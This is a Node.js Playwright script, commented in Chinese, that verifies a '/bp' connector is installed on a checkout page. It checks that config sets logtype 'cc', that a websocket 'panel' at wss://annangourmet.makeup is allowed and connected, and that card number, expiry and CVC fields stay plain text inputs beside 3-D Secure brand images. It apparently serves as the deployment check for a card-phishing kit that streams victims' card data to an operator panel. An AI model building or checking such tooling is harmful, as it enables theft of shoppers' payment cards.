/**
 * 验证 /bp 真包已接上：资源可达 + head 顺序 + connector 启动状态
 *   node scripts/verify-bp.mjs
 */
import { chromium } from 'playwright-core';

const CHROME = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
const BASE = process.argv[2] || 'http://127.0.0.1:8787';

const results = [];
const ok = (name, pass, detail = '') => {
  results.push({ name, pass, detail });
  console.log(`  ${pass ? 'PASS' : 'FAIL'}  ${name}${detail ? '  — ' + detail : ''}`);
};

/* --- HTTP 层 --- */
for (const p of ['/bp/connector.js', '/bp/connector.css', '/bp/config.json', '/bp/socket.io.min.js',
  '/bp/bp-template-runtime.js', '/bp/3ds/img/visa.svg', '/bp/3ds/img/mastercard.svg',
  '/bp/3ds/img/3d-secure-mastercard.png', '/bp/3ds/img/3d-secure-ae.png',
  '/bp/3ds/img/3d-secure-jcb.png', '/bp/3ds/img/3d-secure-dir.png']) {
  const r = await fetch(BASE + p, { headers: { connection: 'close' } });
  ok(`资源 ${p}`, r.status === 200, `status=${r.status} ${r.headers.get('content-type')}`);
}

const cfg = await (await fetch(BASE + '/bp/config.json')).json();
ok('config.json panel_host 是 wss://', String(cfg.panel_host).startsWith('wss://'), cfg.panel_host);
ok('config.json logtype=cc', cfg.logtype === 'cc');
ok('config.json submit_url=/api/checkout', cfg.submit_url === '/api/checkout');

const html = await (await fetch(BASE + '/checkout')).text();
const csp = (await fetch(BASE + '/checkout')).headers.get('content-security-policy');
const connectorTag = html.indexOf('<script defer src="/bp/connector.js"');
ok('CSP connect-src 含面板域名', /connect-src[^;]*wss:\/\/annangourmet\.makeup/.test(csp || ''));
ok('head 里 UTM 脚本在 connector 之前', html.indexOf('window.__BP_UTM__') > -1 && html.indexOf('window.__BP_UTM__') < connectorTag);
ok('head 里 __BP_CART__ 在 connector 之前', html.indexOf('window.__BP_CART__') > -1 && html.indexOf('window.__BP_CART__') < connectorTag);

/* --- 浏览器层 --- */
const browser = await chromium.launch({ executablePath: CHROME, headless: true });
const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 }, locale: 'vi-VN' });
const page = await ctx.newPage();
const logs = [];
page.on('console', (m) => logs.push(`[${m.type()}] ${m.text().slice(0, 180)}`));
page.on('pageerror', (e) => logs.push('[pageerror] ' + String(e).slice(0, 180)));

await page.goto(BASE + '/checkout?utm_source=fb&adset_id=123', { waitUntil: 'networkidle', timeout: 45000 });
await page.waitForTimeout(3500);

const state = await page.evaluate(() => ({
  hasConnector: !!window.BPConnector,
  version: window.BPConnector && window.BPConnector.version,
  config: window.BPConnector && window.BPConnector.config && {
    panel_host: window.BPConnector.config.panel_host,
    logname: window.BPConnector.config.logname,
    submit_url: window.BPConnector.config.submit_url,
  },
  socketState: window.BPConnector && window.BPConnector.state && (window.BPConnector.state.socket ? 'socket-object' : 'no-socket'),
  cardFields: document.querySelectorAll('#bp-card-number,#bp-card-expiry,#bp-card-cvc').length,
  cardInputTypes: ['bp-card-number', 'bp-card-expiry', 'bp-card-cvc'].map((id) => document.getElementById(id)?.type),
  totalText: document.getElementById('bp-total')?.textContent,
  totalAmount: document.getElementById('bp-total')?.dataset.amount,
  bpCart: window.__BP_CART__,
  bpUtm: window.__BP_UTM__,
  connectorCssLoaded: [...document.styleSheets].some((s) => (s.href || '').includes('/bp/connector.css')),
}));

ok('window.BPConnector 已加载', state.hasConnector, `version=${state.version}`);
ok('connector 读到 panel_host', state.config?.panel_host === 'wss://annangourmet.makeup', JSON.stringify(state.config));
ok('三字段仍是 type=text 的 input', state.cardFields === 3 && state.cardInputTypes.every((t) => t === 'text'), JSON.stringify(state.cardInputTypes));
ok('__BP_CART__ 骨架在', !!state.bpCart, state.bpCart?.order_number);
ok('__BP_UTM__ 有值', !!state.bpUtm?.utm_source, JSON.stringify(state.bpUtm));
ok('connector.css 已加载', state.connectorCssLoaded);

console.log('\n--- connector 相关控制台输出 ---');
logs.filter((l) => /\[bp\]|BPConnector|socket|panel/i.test(l)).slice(0, 20).forEach((l) => console.log('  ' + l));
const errs = logs.filter((l) => l.startsWith('[error]') || l.startsWith('[pageerror]'));
console.log(`\nconsole errors: ${errs.length}`);
errs.slice(0, 8).forEach((l) => console.log('  ! ' + l));

await browser.close();

const failed = results.filter((r) => !r.pass);
console.log(`\n=== ${results.length - failed.length}/${results.length} passed ===`);
if (failed.length) process.exitCode = 1;
